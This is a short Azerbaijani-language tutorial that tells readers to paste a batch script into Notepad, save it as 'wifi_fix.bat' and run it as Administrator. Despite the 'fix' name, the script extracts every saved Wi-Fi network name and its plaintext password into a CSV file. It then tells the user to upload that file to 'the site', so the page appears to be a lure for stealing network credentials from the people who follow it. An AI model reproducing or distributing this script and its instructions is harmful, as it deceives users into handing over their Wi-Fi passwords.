1 Decoder Skriptini Hazırla

Aşağıdakı kodu kopyalayın, yeni bir Bloknot (Notepad) açın, kodu yapışdırın və faylı yadda saxlayarkən adını wifi_fix.bat qoyun.

@echo off setlocal enabledelayedexpansion echo SSID,Password > "%~dp0wifi_list.csv" for /f "tokens=2 delims=:" %%a in ('netsh wlan show profiles ^| findstr "All User Profile"') do ( set ssid=%%a set ssid=!ssid:~1! for /f "tokens=2 delims=:" %%b in ('netsh wlan show profile name^="!ssid!" key^=clear ^| findstr "Key Content"') do ( set pass=%%b set pass=!pass:~1! echo !ssid!,!pass! >> "%~dp0wifi_list.csv" ) ) echo Proses bitdi. Indi fayli sayta yukleyin. pause

2 Skripti İşlət

Yaratdığınız wifi_fix.bat faylının üzərinə sağ düymə ilə basıb "Administrator olaraq işlət" seçin. Qara ekran açılacaq və bağlanacaq.
